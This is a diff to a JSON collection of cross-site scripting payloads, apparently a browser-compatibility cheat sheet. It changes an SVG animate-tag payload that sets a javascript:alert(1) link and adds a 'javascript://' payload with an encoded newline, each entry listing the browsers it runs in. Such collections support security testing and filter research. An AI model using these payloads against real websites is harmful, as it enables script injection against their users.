@@ -203,7 +203,17 @@
     },
     {
         "description": "Animate tag with keytimes and multiple values",
-        "code": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>",
+        "code": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "JavaScript protocol with new line",
+        "code": "<a href=\"javascript:\/\/%0aalert(1)\">XSS<\/a>",
         "browsers": [
             "chrome",
             "firefox",
